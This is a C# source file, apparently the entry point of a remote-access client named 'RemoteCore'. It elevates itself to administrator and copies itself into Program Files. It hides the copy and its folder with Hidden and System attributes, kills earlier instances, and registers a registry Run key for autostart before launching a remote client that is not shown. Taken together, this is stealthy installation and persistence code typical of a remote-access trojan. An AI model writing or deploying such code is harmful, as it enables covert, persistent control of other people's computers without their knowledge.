using System;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;
using System.Threading;
using Microsoft.Win32;

namespace RemoteCore
{
    class Program
    {
        static Mutex? _mutex;

        static void Main(string[] args)
        {
            if (!IsAdministrator())
            {
                RunAsAdmin();
                return;
            }

            if (InstallToProgramFiles())
            {
                return; // Exits if it successfully copied and restarted
            }

            bool createdNew;
            _mutex = new Mutex(true, "RemoteCore_Mutex_Unique_ID", out createdNew);

            if (!createdNew)
            {
                // App is already running, exit.
                return;
            }

            SetAutoStart(true);

            var client = new RemoteClient();
            client.StartAsync().GetAwaiter().GetResult();
        }

        static bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        static void RunAsAdmin()
        {
            var processInfo = new ProcessStartInfo(Environment.ProcessPath!)
            {
                UseShellExecute = true,
                Verb = "runas"
            };
            try
            {
                Process.Start(processInfo);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error elevating: {ex.Message}");
            }
        }

        static bool InstallToProgramFiles()
        {
            // Do not self-copy if running from visual studio or uncompiled
            if (!Environment.ProcessPath!.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
                return false;

            string programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
            string targetDir = Path.Combine(programFiles, "RemoteCore");
            string targetPath = Path.Combine(targetDir, "RemoteCore.exe");
            string currentPath = Environment.ProcessPath;

            if (currentPath.Equals(targetPath, StringComparison.OrdinalIgnoreCase))
            {
                return false; // Already running from target location
            }

            try
            {
                if (!Directory.Exists(targetDir))
                {
                    Directory.CreateDirectory(targetDir);
                }

                if (File.Exists(targetPath))
                {
                    var oldProcesses = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(targetPath));
                    foreach (var p in oldProcesses)
                    {
                        if (p.Id != Process.GetCurrentProcess().Id)
                        {
                            try { p.Kill(); p.WaitForExit(1000); } catch { }
                        }
                    }
                    File.Delete(targetPath);
                }

                File.Copy(currentPath, targetPath);

                File.SetAttributes(targetPath, FileAttributes.Hidden | FileAttributes.System);
                File.SetAttributes(targetDir, FileAttributes.Hidden | FileAttributes.System);

                Process.Start(targetPath);
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error installing to Program Files: {ex.Message}");
                return false;
            }
        }

        internal static void SetAutoStart(bool enable)
        {
            try
            {
                using var key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                if (key != null)
                {
                    if (enable)
                        key.SetValue("RemoteCore", Environment.ProcessPath!);
                    else
                        key.DeleteValue("RemoteCore", false);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error setting autostart: {ex.Message}");
            }
        }

        internal static void ReleaseMutex()
        {
            try
            {
                if (_mutex != null)
                {
                    _mutex.ReleaseMutex();
                    _mutex.Dispose();
                    _mutex = null;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error releasing mutex: {ex.Message}");
            }
        }
    }
}